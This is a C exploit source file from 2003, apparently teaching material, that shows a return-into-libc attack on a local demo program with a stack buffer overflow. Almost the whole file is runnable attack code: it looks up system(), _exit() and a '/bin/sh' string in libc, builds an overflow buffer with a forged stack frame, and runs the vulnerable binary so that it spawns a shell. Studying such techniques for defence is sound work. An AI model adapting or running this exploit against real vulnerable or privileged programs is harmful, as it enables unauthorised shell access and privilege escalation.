/*
 * $Id: retlibc1-ex6.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * retlibc1-ex6.c - retlibc1.c exploit (return-into-libc)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit shows the basic return-into-libc technique, changing the
 * execution flow of an abo1.c-like vulnerable program. That's the short
 * version of the previous retlibc1-ex5.c: this time we search for the
 * "/bin/sh" string in libc, just in the neighborhood of system(). It
 * should work, 'cause system() actually makes use of "/bin/sh".
 *
 * $ gcc retlibc1-ex6.c -o retlibc1-ex6 -lc -ldl
 * $ ./retlibc1-ex6 
 * Using system() address: 0x4005f590
 * Using _exit() address: 0x400bae90
 * Using /bin/sh address: 0x4012276d
 * sh-2.05a$ 
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <dlfcn.h>

#define BUF	273			// (65 * 4) + (4 * 3) + 1
#define VULN	"./retlibc1"		// the vulnerable program
#define	SHELL	"/bin/sh"		// the "/bin/sh" string

int search_str2(char *pattern, int addr) /* search for a string in libc */
{
	do
		while ( memcmp((void *)addr, pattern, strlen(pattern) + 1) ) 
			addr++;
	while (!(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000));

	return(addr);
}

int search(char *pattern) /* search for a symbol in libc */
{
	void *p;
	int addr;

	/* dlopen() the main program */
	if ( !(p = dlopen(NULL, RTLD_LAZY)) ) {
		fprintf(stderr, "%s\n", dlerror());
		exit(-1);
	}

	/* search for the pattern */
	if ( !(addr = (int)dlsym(p, pattern)) ) {
		fprintf(stderr, "%s\n", dlerror());
		exit(-1);
	}

	/* check the address for the presence of a 0x0 */
	if ( !(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||
			!(addr & 0xff000000) ) {
		fprintf(stderr, "the address of %s contains a 0x0!\n", pattern);
		exit(-1);
	}

	dlclose(p);
	return(addr);
}

int main()
{
	char buf[BUF];

	int system = search("system"); 
	int exit = search("_exit"); /* can't use exit() */
	int shell = search_str2(SHELL, system);

	int *p = (int *)buf;

	fprintf(stderr, "Using system() address: %p\n", system);
	fprintf(stderr, "Using _exit() address: %p\n", exit);
	fprintf(stderr, "Using /bin/sh address: %p\n", shell);

	/* fill the first part of the buffer */
	memset(buf, 'A', BUF);
	p += 65;

	/* prepare the stack */
	*p++ = system;	/* system() address in libc */
	*p++ = exit;	/* _exit() address in libc */
	*p++ = shell;	/* "/bin/sh" address in libc */
	*p = 0x0;

	/* run the vulnerable program */
	execl(VULN, VULN + 2, buf, NULL);
	perror("execl");
}
